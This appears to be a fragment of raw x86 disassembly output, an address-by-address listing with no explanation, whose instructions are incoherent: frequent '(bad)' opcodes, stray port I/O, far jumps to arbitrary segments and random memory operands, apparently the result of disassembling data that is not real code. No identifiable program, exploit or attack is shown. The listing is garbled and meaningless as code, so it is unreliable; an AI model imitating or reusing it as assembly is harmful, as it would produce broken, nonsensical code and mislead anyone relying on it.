  41ab4b:	sbb    DWORD PTR [edx],esi
  41ab4d:	addr16 out 0xc8,eax
  41ab50:	test   ch,0xa9
  41ab53:	jle    0x41aad8
  41ab55:	pop    eax
  41ab56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab57:	mov    cl,0x28
  41ab59:	dec    esi
  41ab5a:	pop    ebx
  41ab5b:	mov    al,0xf4
  41ab5d:	frstor [ebp-0x12928365]
  41ab63:	add    BYTE PTR [esi-0x5e],0x98
  41ab67:	xchg   esi,eax
  41ab68:	clc    
  41ab69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab6a:	std    
  41ab6b:	mov    ch,dh
  41ab6d:	lock cmp ebp,esi
  41ab70:	shl    BYTE PTR [edx-0x3f185528],0x69
  41ab77:	inc    BYTE PTR [ecx]
  41ab79:	outs   dx,DWORD PTR ds:[esi]
  41ab7a:	ds jle 0x41ab6f
  41ab7d:	loope  0x41ab07
  41ab7f:	pop    ss
  41ab80:	stos   BYTE PTR es:[edi],al
  41ab81:	lds    ecx,FWORD PTR [eax+0x1e]
  41ab84:	hlt    
  41ab85:	test   DWORD PTR [edi+0x116b9140],esi
  41ab8b:	dec    ebx
  41ab8c:	(bad)  
  41ab8d:	mov    ecx,eax
  41ab8f:	xlat   BYTE PTR ds:[ebx]
  41ab90:	cwde   
  41ab91:	dec    esi
  41ab92:	mov    edi,0xa0657495
  41ab97:	and    BYTE PTR [eax-0x4301bc3c],dl
  41ab9d:	mov    cs,edi
  41ab9f:	dec    ecx
  41aba0:	outs   dx,DWORD PTR ds:[esi]
  41aba1:	out    dx,eax
  41aba2:	loope  0x41ab25
  41aba4:	(bad)  
  41aba5:	sub    BYTE PTR [ebx+0x46],al
  41aba8:	mov    ds:0x50372e,eax
  41abad:	cmp    cl,BYTE PTR [ebx]
  41abaf:	hlt    
  41abb0:	inc    ebx
  41abb1:	dec    ebp
  41abb2:	dec    esi
  41abb3:	aam    0x25
  41abb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abb6:	cmp    bl,dh
  41abb8:	into   
  41abb9:	pop    ss
  41abba:	test   eax,0xa38a0862
  41abbf:	adc    DWORD PTR [ecx],ebx
  41abc1:	outs   dx,BYTE PTR ds:[esi]
  41abc2:	or     eax,0x8a9995d9
  41abc7:	div    cl
  41abc9:	mov    edi,0xa587d71e
  41abce:	clc    
  41abcf:	jnp    0x41abb0
  41abd1:	push   cs
  41abd2:	(bad)  
  41abd3:	and    edi,edx
  41abd5:	ficom  WORD PTR [edx-0x7c]
  41abd8:	dec    ebx
  41abd9:	lods   eax,DWORD PTR ds:[esi]
  41abda:	aam    0x5f
  41abdc:	addr16 dec esp
  41abde:	int3   
  41abdf:	shr    BYTE PTR [eax],1
  41abe1:	repnz push es
  41abe3:	jbe    0x41abde
  41abe5:	push   ds
  41abe6:	outs   dx,BYTE PTR ds:[esi]
  41abe7:	push   0xffffff94
  41abe9:	retf   
  41abea:	cld    
  41abeb:	add    ch,BYTE PTR [ebx+0x762b15e0]
  41abf1:	rol    BYTE PTR [eax+0x3db54ac8],0x28
  41abf8:	popf   
  41abf9:	cld    
  41abfa:	outs   dx,BYTE PTR ds:[esi]
  41abfb:	push   ebx
  41abfc:	cmp    al,0xae
  41abfe:	leave  
  41abff:	rol    DWORD PTR [ecx+0x2ecff6f7],cl
  41ac05:	add    eax,0x5658e611
  41ac0a:	(bad)  
  41ac0c:	dec    ecx
  41ac0d:	inc    ebp
  41ac0e:	xor    bl,BYTE PTR [edi]
  41ac10:	jmp    DWORD PTR [esi]
  41ac12:	inc    ebx
  41ac13:	and    eax,0xeac2e3e0
  41ac18:	call   0xf4afaf21
  41ac1d:	pop    esi
  41ac1e:	jl     0x41ac9c
  41ac20:	ret    
  41ac21:	mov    esi,0x509ede43
  41ac26:	mov    bl,0x17
  41ac28:	push   es
  41ac29:	sub    edi,DWORD PTR [edi+edx*2+0x43]
  41ac2d:	stos   DWORD PTR es:[edi],eax
  41ac2e:	outs   dx,DWORD PTR ds:[esi]
  41ac2f:	ror    DWORD PTR [eax],0x7
  41ac32:	aaa    
  41ac33:	push   ss
  41ac34:	test   eax,0x1c982fb7
  41ac39:	out    0xba,eax
  41ac3b:	pop    esi
  41ac3c:	mul    DWORD PTR [ebx-0x75]
  41ac3f:	jb     0x41ac9c
  41ac41:	test   DWORD PTR [ecx-0x5],0xcee4037c
  41ac48:	mov    al,0xad
  41ac4a:	imul   eax,DWORD PTR [ebp-0x6e56e0fd],0xffffffb7
  41ac51:	data16 aam 0x12
  41ac54:	std    
  41ac55:	arpl   dx,dx
  41ac57:	loop   0x41ac46
  41ac59:	push   edx
  41ac5a:	adc    al,0xd2
  41ac5c:	adc    ecx,DWORD PTR [eax+eiz*4-0x6eb521af]
  41ac63:	in     al,dx
  41ac64:	sub    DWORD PTR [ecx],ecx
  41ac66:	jmp    0x290e:0xa75369ae
  41ac6d:	add    DWORD PTR [edx+0x2e],0xffffffed
  41ac71:	shl    BYTE PTR [ebx+ebx*2],cl
  41ac74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac75:	sub    BYTE PTR [ebp+0x2b84ccc9],ch
  41ac7b:	adc    ebx,esp
  41ac7d:	add    eax,esi
  41ac7f:	loope  0x41ac88
  41ac81:	sahf   
  41ac82:	or     DWORD PTR [ebx+0x284cb8f4],0xffffffe9
  41ac89:	sub    eax,0x4df75fad
  41ac8e:	xchg   edx,eax
  41ac8f:	fnstsw WORD PTR [edi-0x23]
  41ac92:	push   0x1c
  41ac94:	stos   DWORD PTR es:[edi],eax
  41ac95:	jns    0x41acc6
  41ac97:	fstp   DWORD PTR [ebp+0x2e]
  41ac9a:	dec    edx
  41ac9b:	(bad)  
  41ac9d:	mov    esp,0x55d2abd8
  41aca2:	adc    ebx,DWORD PTR [eax]
  41aca4:	mov    cl,0x18
  41aca6:	jns    0x41ac4b
  41aca8:	and    dl,BYTE PTR [ebx+0x2faf63fd]
  41acae:	mov    DWORD PTR [ebx+0x4c],edi
  41acb1:	fadd   DWORD PTR [esi+0x65669e41]
  41acb7:	xchg   esi,eax
  41acb8:	mov    al,ds:0x3a33a102
  41acbd:	push   edi
  41acbe:	retf   0x6489
  41acc1:	mov    eax,ds:0xe8c2b49d
  41acc6:	das    
  41acc7:	adc    al,0xba
  41acc9:	push   esp
  41acca:	dec    BYTE PTR [eax-0x7bdac716]
  41acd0:	mov    ebp,0xf62d2caf
  41acd5:	xchg   esi,eax
  41acd6:	mul    BYTE PTR [ebx+0x612da454]
  41acdc:	test   BYTE PTR [eax],bl
  41acde:	adc    al,0xe6
  41ace0:	mov    al,BYTE PTR [ebx]
  41ace2:	xchg   ebp,eax
  41ace3:	push   es
  41ace4:	sbb    esp,DWORD PTR [edx]
  41ace6:	pop    edi
  41ace7:	mov    cs,ebx
  41ace9:	test   al,0xe9
  41aceb:	dec    edx
  41acec:	aam    0x7
  41acee:	xchg   ecx,eax
  41acef:	sbb    al,BYTE PTR [esi-0x292e1c26]
  41acf5:	and    ebx,DWORD PTR [edx+edi*8+0x67e7e27b]
  41acfc:	fdivr  DWORD PTR [edx]
  41acfe:	(bad)  
  41acff:	push   edi
  41ad00:	bound  edi,QWORD PTR [eax+0x70ce6eb]
  41ad06:	sbb    al,0xc2
  41ad08:	cdq    
  41ad09:	add    ecx,DWORD PTR [eax]
  41ad0b:	(bad)  
  41ad0d:	and    BYTE PTR [edx+eiz*1],dl
  41ad10:	test   eax,0x466bc1ad
  41ad15:	sahf   
  41ad16:	inc    ecx
  41ad17:	jmp    0x41aca2
  41ad19:	and    BYTE PTR [ecx+eiz*4+0x5648532b],ah
  41ad20:	test   DWORD PTR [edi+edx*1-0x66],0xd9c8440
  41ad28:	sbb    al,0xfb
  41ad2a:	xchg   esp,eax
  41ad2b:	add    eax,0x5305256e
  41ad30:	aad    0x29
  41ad32:	inc    ebx
  41ad33:	jg     0x41acfc
  41ad35:	and    DWORD PTR [ebp-0x71c35272],ebp
  41ad3b:	add    al,0x4d
  41ad3d:	(bad)  
  41ad3e:	cmp    ebx,DWORD PTR [ebp-0x3b]
  41ad41:	retf   0x7d96
  41ad44:	pusha  
  41ad45:	inc    esi
  41ad46:	push   ecx
  41ad47:	xchg   ebx,eax
  41ad48:	rol    DWORD PTR [edi+0x7f],0x54
  41ad4c:	mov    dh,0xdc
  41ad4e:	mov    DWORD PTR [edi+0x5a7de7fa],ebx
  41ad54:	mov    dl,0xd
  41ad56:	and    BYTE PTR [edi+0x316dd924],ah
  41ad5c:	cwde   
  41ad5d:	add    ebp,DWORD PTR [esi+eax*4]
  41ad60:	test   BYTE PTR [edi+ebp*2+0x17],0xb0
  41ad65:	das    
  41ad66:	in     al,dx
  41ad67:	jns    0x41ad8c
  41ad69:	in     al,0x36
  41ad6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad6c:	push   esp
  41ad6d:	xchg   ebp,eax
  41ad6e:	adc    bl,bh
  41ad70:	mov    ds:0xda4c0f9c,eax
  41ad75:	push   0x58f364aa
  41ad7a:	mov    ebp,DWORD PTR [ebp+0x18]
  41ad7d:	push   esp
  41ad7e:	fistp  WORD PTR [edi]
  41ad80:	shl    BYTE PTR [eax+eiz*8+0x75],1
  41ad84:	push   ebx
  41ad85:	(bad)  
  41ad86:	call   DWORD PTR ds:0xac6c6d28
  41ad8c:	inc    ecx
  41ad8d:	push   ecx
  41ad8e:	es jno 0x41ad5d
  41ad91:	lock jb 0x41ad44
  41ad94:	or     BYTE PTR [edx],ch
  41ad96:	arpl   WORD PTR ds:[edx],bp
  41ad99:	bound  esp,QWORD PTR [edx+0x70d6b84a]
  41ad9f:	add    BYTE PTR [edx+edi*2+0x4fdbf776],al
  41ada6:	fs adc eax,0x3bdc4fbb
  41adac:	fistp  WORD PTR ds:0xba7412ab
  41adb2:	jecxz  0x41ade5
  41adb4:	pop    ebx
  41adb5:	adc    al,0xb7
  41adb7:	jl     0x41aded
  41adb9:	sbb    DWORD PTR [edx+0x356a533b],ebp
  41adbf:	outs   dx,DWORD PTR ds:[esi]
  41adc0:	dec    esp
  41adc1:	adc    DWORD PTR [ebx+0x676038ab],eax
  41adc7:	dec    esp
  41adc8:	fidivr WORD PTR [esi-0x26]
  41adcb:	bound  ebx,QWORD PTR [edx+edi*8+0x7dc5aa2f]
  41add2:	les    esi,FWORD PTR [ebp-0x1dd6a26b]
  41add8:	push   edx
  41add9:	inc    esp
  41adda:	sub    eax,0xdeef4860
  41addf:	scas   eax,DWORD PTR es:[edi]
  41ade0:	leave  
  41ade1:	data16 cmp BYTE PTR [esi+ecx*1],bl
  41ade5:	retf   0xcce9
  41ade8:	mov    DWORD PTR [ecx+0x5c],edi
  41adeb:	les    edx,FWORD PTR [edx-0x49]
  41adee:	and    DWORD PTR [ebx-0x45],ebp
  41adf1:	aaa    
  41adf2:	xor    BYTE PTR [edx+0x5e],ch
  41adf5:	or     DWORD PTR [ecx],0x262a2f49
  41adfb:	mov    bl,0x24
  41adfd:	aaa    
  41adfe:	call   0x233eac6c
  41ae03:	(bad)  
  41ae04:	jg     0x41adf6
  41ae06:	pop    esi
  41ae07:	pop    esp
  41ae08:	pop    ss
  41ae09:	sub    eax,0xee309cd3
  41ae0e:	mov    bl,0xf7
  41ae10:	sti    
  41ae11:	add    bh,BYTE PTR ds:0xac02a667
  41ae17:	xchg   esp,eax
  41ae18:	ins    BYTE PTR es:[edi],dx
  41ae19:	pop    ebp
  41ae1a:	stos   BYTE PTR es:[edi],al
  41ae1b:	mov    ds:0xfe717dca,al
  41ae20:	retf   
  41ae21:	push   bx
  41ae23:	fild   QWORD PTR [edi+0x78]
  41ae26:	int3   
  41ae27:	repnz push ss
  41ae29:	clc    
  41ae2a:	sbb    eax,0x24869dcd
  41ae2f:	or     DWORD PTR fs:0xce206777,ebx
  41ae36:	lods   eax,DWORD PTR ds:[esi]
  41ae37:	inc    ecx
  41ae38:	lahf   
  41ae39:	fidivr DWORD PTR [edi-0x6a]
  41ae3c:	dec    esi
  41ae3d:	imul   esp,DWORD PTR [ecx+edi*1+0x52],0x3d61e656
  41ae45:	pop    ds
  41ae46:	sub    DWORD PTR [ebx],edx
  41ae48:	sbb    DWORD PTR [edi+0x28],edi
  41ae4b:	into   
  41ae4c:	mov    cl,0x33
  41ae4e:	push   ebx
  41ae4f:	sbb    bh,BYTE PTR [esi+0x4f7d4af1]
  41ae55:	sbb    BYTE PTR [ecx-0x347398a3],cl
  41ae5b:	mov    ch,0x85
  41ae5d:	into   
  41ae5e:	sbb    BYTE PTR [eax+eax*8+0x3731bd2a],al
  41ae65:	fisub  WORD PTR [edx-0x3dd3d1de]
  41ae6b:	mov    al,ds:0x671f2eaa
  41ae70:	mov    esi,0x2d611e60
  41ae75:	lods   al,BYTE PTR ds:[esi]
  41ae76:	ror    DWORD PTR ds:0xcda711f3,cl
  41ae7c:	enter  0xadd4,0xcb
  41ae80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae81:	jae    0x41af02
  41ae83:	xor    esi,DWORD PTR [ebx-0x5ccaf8fd]
  41ae89:	mov    dh,0x94
  41ae8b:	adc    DWORD PTR [esi],eax
  41ae8d:	mov    esi,0x8a072635
  41ae92:	loop   0x41af06
  41ae94:	dec    edi
  41ae95:	leave  
  41ae96:	sti    
  41ae97:	mov    bh,0x6b
  41ae99:	add    dh,cl
  41ae9b:	in     al,0xed
  41ae9d:	pop    ecx
  41ae9e:	cmp    DWORD PTR [ecx],eax
  41aea0:	xchg   esi,eax
  41aea1:	inc    ebp
  41aea2:	test   eax,0xf5693439
  41aea7:	sub    DWORD PTR [edi-0x6e],ecx
  41aeaa:	push   edi
  41aeab:	enter  0x9787,0xb
  41aeaf:	cdq    
  41aeb0:	xchg   esp,eax
  41aeb1:	and    DWORD PTR [eax],eax
  41aeb3:	imul   DWORD PTR [ebx]
  41aeb5:	xor    ch,BYTE PTR [edx]
  41aeb7:	pusha  
  41aeb8:	in     al,0x35
  41aeba:	out    0xd1,al
  41aebc:	mov    bl,0x80
  41aebe:	add    ecx,esi
  41aec0:	(bad)  
  41aec1:	xchg   ecx,eax
  41aec2:	cdq    
  41aec3:	push   ebp
  41aec4:	dec    ebp
  41aec5:	or     al,0xd1
  41aec7:	imul   eax,DWORD PTR [eax-0x6b],0x5d
  41aecb:	(bad)  
  41aecc:	scas   eax,DWORD PTR es:[edi]
  41aecd:	push   es
  41aece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aecf:	lahf   
  41aed0:	dec    eax
  41aed1:	mov    fs,ebx
  41aed3:	sub    eax,0x6266a255
  41aed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aed9:	sub    BYTE PTR [esi-0x73],ch
  41aedc:	xchg   ebx,eax
  41aedd:	inc    esi
  41aede:	mov    edx,0xa615474c
  41aee3:	pusha  
  41aee4:	(bad)  
  41aee5:	pushf  
  41aee6:	push   ecx
  41aee7:	shl    DWORD PTR [ebx],cl
  41aee9:	lds    ebx,FWORD PTR [ebp-0xf669cc9]
  41aeef:	inc    esi
  41aef0:	fdiv   DWORD PTR ds:0xbdf18e37
  41aef6:	(bad)  
  41aef7:	(bad)  
  41aef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aef9:	scas   eax,DWORD PTR es:[edi]
  41aefa:	mov    esp,0xc594787
  41aeff:	neg    DWORD PTR [edi]
  41af01:	test   eax,0xe4518cc9
  41af06:	hlt    
  41af07:	enter  0x69aa,0x6c
  41af0b:	out    dx,eax
  41af0c:	xchg   esp,eax
  41af0d:	fld    QWORD PTR [ecx]
  41af0f:	push   es
  41af10:	fnstcw WORD PTR [eax+0x2681742a]
  41af16:	dec    edi
  41af17:	sub    BYTE PTR [edx-0x55],cl
  41af1a:	add    eax,0xb136310c
  41af1f:	add    DWORD PTR [ecx-0x2c],esp
  41af22:	nop
  41af23:	sub    eax,0xaae9d80d
  41af28:	ret    
  41af29:	mov    ah,0xd
  41af2b:	inc    edx
  41af2c:	inc    eax
  41af2d:	and    bh,BYTE PTR [eax-0xb]
  41af30:	inc    edx
  41af31:	ds out 0xcb,eax
  41af34:	jle    0x41af5e
  41af36:	sbb    ah,bl
  41af38:	jmp    0xce12bc59
  41af3d:	jmp    0xbee45969
  41af42:	ret    
  41af43:	data16 das 
  41af45:	js     0x41af83
  41af47:	xchg   esi,eax
  41af48:	and    DWORD PTR [edx],esi
  41af4a:	adc    BYTE PTR [eax+eiz*4],0x53
  41af4e:	test   ch,cl
  41af50:	mov    esi,DWORD PTR [ecx]
  41af52:	mov    WORD PTR [edx+0x21],?
  41af55:	dec    esp
  41af56:	std    
  41af57:	out    0x5c,al
  41af59:	mov    esp,edi
  41af5b:	inc    ebx
  41af5c:	pop    eax
  41af5d:	in     al,0x81
  41af5f:	arpl   WORD PTR [eax+0x1a],bp
  41af62:	adc    ebx,DWORD PTR [esi]
  41af64:	add    ah,BYTE PTR [eax-0x3]
  41af67:	xor    ch,bh
  41af69:	and    eax,0x18666cfc
  41af6e:	int3   
  41af6f:	mov    ds:0xb130772e,eax
  41af74:	(bad)  
  41af75:	mov    esi,0xd873063
  41af7a:	cmovo  ecx,DWORD PTR [edx+0x5bca3530]
  41af81:	jle    0x41af3e
  41af83:	and    dl,BYTE PTR [esi+0x57]
  41af86:	dec    ecx
  41af87:	imul   esp,DWORD PTR [edi+eax*2],0xfffffffb
  41af8b:	into   
  41af8c:	repnz mov edx,0x9b4c8639
  41af92:	js     0x41af6b
  41af94:	add    ebx,0x480a1842
  41af9a:	xor    eax,0x92173d74
  41af9f:	outs   dx,BYTE PTR ds:[esi]
  41afa0:	dec    edx
  41afa1:	xor    eax,0x50779d9c
  41afa6:	mov    esp,edx
  41afa8:	(bad)  
  41afa9:	test   DWORD PTR [edx],eax
  41afab:	sub    cl,BYTE PTR [ebx]
  41afad:	adc    al,0x9e
  41afaf:	dec    esp
  41afb0:	inc    esp
  41afb1:	gs cmc 
  41afb3:	je     0x41affc
  41afb5:	xor    BYTE PTR [edx-0xc0df9d8],bh
  41afbb:	repnz daa 
  41afbd:	aam    0x1d
  41afbf:	ret    
  41afc0:	mov    ds:0x3c097d2b,eax
  41afc5:	push   es
  41afc6:	sbb    edi,ecx
  41afc8:	mov    WORD PTR [ecx+0x5f],ss
  41afcb:	faddp  st(7),st
  41afcd:	xchg   edx,eax
  41afce:	jb     0x41b001
  41afd0:	cmp    ch,BYTE PTR [ebx+esi*1-0x47f3bdfe]
  41afd7:	out    dx,al
  41afd8:	xchg   esp,eax
  41afd9:	stos   BYTE PTR es:[edi],al
  41afda:	cmp    esi,DWORD PTR [edx+0x54aa9050]
  41afe0:	sbb    ebx,eax
  41afe2:	leave  
  41afe3:	dec    edx
  41afe4:	pop    esi
  41afe5:	push   eax
  41afe6:	push   esi
  41afe7:	jne    0x41aff4
  41afe9:	sahf   
  41afea:	lea    ecx,[ebx]
  41afec:	shl    cl,0xac
  41afef:	rol    BYTE PTR [ebp+0x4a],0x8c
  41aff3:	jecxz  0x41b00e
  41aff5:	inc    esi
  41aff6:	sahf   
  41aff7:	(bad)  [edi+0xc]
  41affa:	add    al,0x25
  41affc:	enter  0xf15,0xab
  41b000:	add    eax,0xbeff3651
  41b005:	sbb    ecx,DWORD PTR ds:0x88ec48c4
  41b00b:	adc    al,0x58
  41b00d:	pop    ebp
  41b00e:	nop
  41b00f:	jmp    0x41afb5
  41b011:	aaa    
  41b012:	fld    TBYTE PTR [esi]
  41b014:	retf   0x6
  41b017:	pop    edx
  41b018:	push   cs
  41b019:	bound  edi,QWORD PTR [esi]
  41b01b:	aaa    
  41b01c:	xchg   esi,eax
  41b01d:	and    al,0xb8
  41b01f:	push   ds
  41b020:	mov    bl,0x78
  41b022:	xchg   ebp,eax
  41b023:	dec    ebx
  41b024:	(bad)  
  41b025:	xor    bh,BYTE PTR [edi-0x62]
  41b028:	ss in  eax,0x1b
  41b02b:	mov    cl,0xaf
  41b02d:	sti    
  41b02e:	mov    ?,WORD PTR [edx-0x4b]
  41b031:	hlt    
  41b032:	out    dx,al
  41b033:	retf   0x3353
  41b036:	mov    edi,0x6dd44d69
  41b03b:	pop    edi
  41b03c:	mov    edi,0x836782c0
  41b041:	dec    ebp
  41b042:	mov    bl,0xdc
  41b044:	popa   
  41b045:	std    
  41b046:	inc    esp
  41b047:	push   ebp
  41b048:	mov    ebp,0x53ad046f
  41b04d:	adc    al,0xb8
  41b04f:	fwait
  41b050:	inc    edx
  41b051:	loope  0x41afd9
  41b053:	jecxz  0x41b0d4
  41b055:	dec    esi
  41b056:	and    ecx,ebp
  41b058:	pop    esp
  41b059:	jbe    0x41b0bf
  41b05b:	aaa    
  41b05c:	push   0x25
  41b05e:	int    0x34
  41b060:	sbb    eax,0xd436835b
  41b065:	push   fs
  41b067:	ss (bad) 
  41b069:	xchg   edx,eax
  41b06a:	or     BYTE PTR [eax],al
  41b06c:	enter  0xef6f,0x49
  41b070:	mov    edx,0x32402824
  41b075:	scas   al,BYTE PTR es:[edi]
  41b076:	and    esi,DWORD PTR [edx]
  41b078:	fwait
  41b079:	jle    0x41b0f7
  41b07b:	xchg   ebp,eax
  41b07c:	repnz dec ebp
  41b07e:	mov    edi,0x6b0d0adf
  41b083:	inc    edi
  41b084:	inc    edi
  41b085:	lods   al,BYTE PTR ds:[esi]
  41b086:	dec    edx
  41b087:	fwait
  41b088:	ss add edi,edi
  41b08b:	jb     0x41b0b1
  41b08d:	jmp    0x117c:0x83e2052a
  41b094:	xor    DWORD PTR [ebp+0x19],edx
  41b097:	pop    ds
  41b098:	and    BYTE PTR [edx-0x60cb3783],ah
  41b09e:	or     eax,0xe590991b
  41b0a3:	aas    
  41b0a4:	aas    
  41b0a5:	mov    ebx,DWORD PTR [ebp+edx*1+0x4]
  41b0a9:	dec    eax
  41b0aa:	aas    
  41b0ab:	es out dx,eax
  41b0ad:	dec    esp
  41b0ae:	lods   al,BYTE PTR ds:[esi]
  41b0af:	sub    ah,BYTE PTR [edx+ecx*2+0x32950e39]
  41b0b6:	dec    edi
  41b0b7:	fwait
  41b0b8:	bound  ecx,QWORD PTR [esi]
  41b0ba:	ret    0xd894
  41b0bd:	inc    ebp
  41b0be:	test   DWORD PTR [esi+0x34],edi
  41b0c1:	cmp    BYTE PTR [edi],0x3d
  41b0c4:	adc    al,0x45
  41b0c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0c7:	ins    BYTE PTR es:[edi],dx
  41b0c8:	cli    
  41b0c9:	imul   esp,DWORD PTR [edi+ecx*1],0xcf0c4ccf
  41b0d0:	movaps xmm0,xmm1
  41b0d3:	cld    
  41b0d4:	inc    esi
  41b0d5:	push   eax
  41b0d6:	add    al,0x90
  41b0d8:	test   BYTE PTR [ebp+0x7c58b25d],ah
  41b0de:	shl    BYTE PTR [eax],1
  41b0e0:	mov    dl,0x5d
  41b0e2:	jl     0x41b0aa
  41b0e4:	call   0x6727:0xadd1f9b6
  41b0eb:	bound  edx,QWORD PTR [eax]
  41b0ed:	inc    ecx
  41b0ee:	sti    
  41b0ef:	and    dl,dl
  41b0f1:	scas   al,BYTE PTR es:[edi]
  41b0f2:	adc    dl,BYTE PTR [ebp+0x2c]
  41b0f5:	test   BYTE PTR [esi+esi*8],al
  41b0f8:	xor    DWORD PTR [ecx+0x34],ebx
  41b0fb:	jnp    0x41b0f0
  41b0fd:	xchg   edx,eax
  41b0fe:	xor    edi,ebx
  41b100:	icebp  
  41b101:	arpl   WORD PTR [ecx-0x66],bx
  41b104:	push   0xad69eeea
  41b109:	test   DWORD PTR [edx],ebp
  41b10b:	inc    ecx
  41b10c:	out    0xf8,al
  41b10e:	jbe    0x41b10a
  41b110:	in     eax,dx
  41b111:	push   ss
  41b112:	aas    
  41b113:	(bad)  
  41b114:	xchg   ecx,eax
  41b115:	jb     0x41b108
  41b117:	push   ds
  41b118:	cdq    
  41b119:	scas   eax,DWORD PTR es:[edi]
  41b11a:	adc    BYTE PTR [eax],dh
  41b11c:	sub    DWORD PTR [ecx-0x788da474],esi
  41b122:	jmp    0xf405:0x5ba2092a
  41b129:	mov    bl,0x6a
  41b12b:	mov    esp,0x632155f0
  41b130:	(bad)  
  41b131:	and    DWORD PTR [eax+eiz*4+0x2e21acbb],ebx
  41b138:	mov    ah,0x37
  41b13a:	xchg   esi,eax
  41b13b:	je     0x41b1b8
  41b13d:	sbb    al,0xa2
  41b13f:	aaa    
  41b140:	repnz mov BYTE PTR [edx+0x54],ch
  41b144:	sbb    BYTE PTR [esi-0x49],bh
  41b147:	rcr    DWORD PTR [eax-0x6912a93b],cl
  41b14d:	(bad)  
  41b14e:	sub    bh,al
  41b150:	shr    BYTE PTR [edi],0x23
  41b153:	adc    BYTE PTR [ecx+0x44],bl
  41b156:	test   DWORD PTR [eax+0x3d],esp
  41b159:	pop    ebp
  41b15a:	dec    esi
  41b15b:	or     bh,BYTE PTR [edx]
  41b15d:	inc    ecx
  41b15e:	js     0x41b1d6
  41b160:	mov    dh,BYTE PTR [eax-0x41b5c56f]
  41b166:	mov    esi,0xa6939bea
  41b16b:	in     al,dx
  41b16c:	mov    ds:0x3fe839e,al
  41b171:	cmc    
  41b172:	pop    esi
  41b173:	adc    ebp,DWORD PTR [eax-0x55]
  41b176:	fistp  WORD PTR ds:0x95c86a34
  41b17c:	bound  ebp,QWORD PTR [edi]
  41b17e:	xlat   BYTE PTR ds:[ebx]
  41b17f:	in     eax,0x4f
  41b181:	push   0x2e
  41b183:	dec    esp
  41b184:	push   ebx
  41b185:	jae    0x41b1a9
  41b187:	inc    edi
  41b188:	cmp    eax,0x42aed24b
  41b18d:	(bad)  
  41b18e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b18f:	sbb    bl,dh
  41b191:	push   ecx
  41b192:	stc    
  41b193:	add    al,0x8
  41b195:	lods   al,BYTE PTR ds:[esi]
  41b196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b197:	sub    al,0x49
  41b199:	inc    edi
  41b19a:	jmp    0x941c:0x3dce32e0
  41b1a1:	inc    edi
  41b1a2:	sahf   
  41b1a3:	jnp    0x41b196
  41b1a5:	and    BYTE PTR [ebx-0x7c503f38],cl
  41b1ab:	adc    BYTE PTR [ecx],bl
  41b1ad:	neg    BYTE PTR [ecx+esi*1-0x2b7a8a91]
  41b1b4:	xor    edx,DWORD PTR [eax+0x7b]
  41b1b7:	or     bl,bh
  41b1b9:	stos   BYTE PTR es:[edi],al
  41b1ba:	or     eax,0x2f12607f
  41b1bf:	pop    ss
  41b1c0:	add    BYTE PTR [ebp-0x17],ch
  41b1c3:	out    0x2c,al
  41b1c5:	add    DWORD PTR [edi+edx*4],0xffffff85
  41b1c9:	shl    DWORD PTR [eax-0x6775ef88],cl
  41b1cf:	add    eax,DWORD PTR [edx+0x13725c52]
  41b1d5:	frndint 
  41b1d7:	and    DWORD PTR [eax],edx
  41b1d9:	dec    esp
  41b1da:	js     0x41b18b
  41b1dc:	sbb    bh,ah
  41b1de:	test   BYTE PTR [ebp-0x7b],al
  41b1e1:	add    bl,BYTE PTR [ebp+0x498bfeca]
  41b1e7:	lods   eax,DWORD PTR ds:[esi]
  41b1e8:	adc    bh,BYTE PTR [edx]
  41b1ea:	fild   WORD PTR [esi-0x76b3e82e]
  41b1f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1f1:	jne    0x41b175
  41b1f3:	aas    
  41b1f4:	js     0x41b19c
  41b1f6:	aad    0x48
  41b1f8:	xchg   DWORD PTR [ebx+0x31ccbc13],ecx
  41b1fe:	js     0x41b25a
  41b200:	xchg   esp,eax
  41b201:	fld    QWORD PTR [edi-0x69]
  41b204:	xor    eax,0x38bb7ea0
  41b209:	mov    al,ds:0x3658ae24
  41b20e:	out    0x81,eax
  41b210:	mov    eax,ds:0xe53ce9da
  41b215:	outs   dx,DWORD PTR ds:[esi]
  41b216:	(bad)  
  41b217:	ror    DWORD PTR [ebx+0x26],cl
  41b21a:	add    BYTE PTR [eax-0x50492fc7],bh
  41b220:	frstor [eax+edi*8]
  41b223:	test   eax,0x3377557d
  41b228:	push   0xa50dbfae
  41b22d:	inc    edx
  41b22e:	lahf   
  41b22f:	mov    al,ds:0x682daab1
  41b234:	sbb    bl,BYTE PTR [ebx+0x6fe53f02]
  41b23a:	lods   eax,DWORD PTR cs:[esi]
  41b23c:	adc    eax,0xfaae18b3
  41b241:	lds    esi,FWORD PTR [eax+0x5ea792c2]
  41b247:	inc    ebx
  41b248:	adc    ch,cl
  41b24a:	iret   
  41b24b:	sub    BYTE PTR [ebp+0x26caa204],dh
  41b251:	ins    BYTE PTR es:[edi],dx
  41b252:	dec    ebx
  41b253:	aam    0xaa
  41b255:	dec    ebx
  41b256:	pop    ds
  41b257:	add    DWORD PTR [eax+esi*1+0x73],eax
  41b25b:	je     0x41b2cb
  41b25d:	sub    al,0x89
  41b25f:	adc    bh,al
  41b261:	(bad)  
  41b262:	ja     0x41b279
  41b264:	push   edi
  41b265:	and    DWORD PTR [eax-0x78],0xffffffe7
  41b269:	jg     0x41b2b0
  41b26b:	push   edx
  41b26c:	mov    esp,0xa933710c
  41b271:	xlat   BYTE PTR ds:[ebx]
  41b272:	push   ss
  41b273:	push   edi
  41b274:	pusha  
  41b275:	cwde   
  41b276:	mov    al,0xc9
  41b278:	sbb    edi,ecx
  41b27a:	shl    BYTE PTR [esi-0x7e67eadc],0xa6
  41b281:	ficom  WORD PTR [ecx+0x1]
  41b284:	mov    ds:0x86bb4a99,al
  41b289:	mov    DWORD PTR [edi+edi*4+0x73],esi
  41b28d:	push   edi
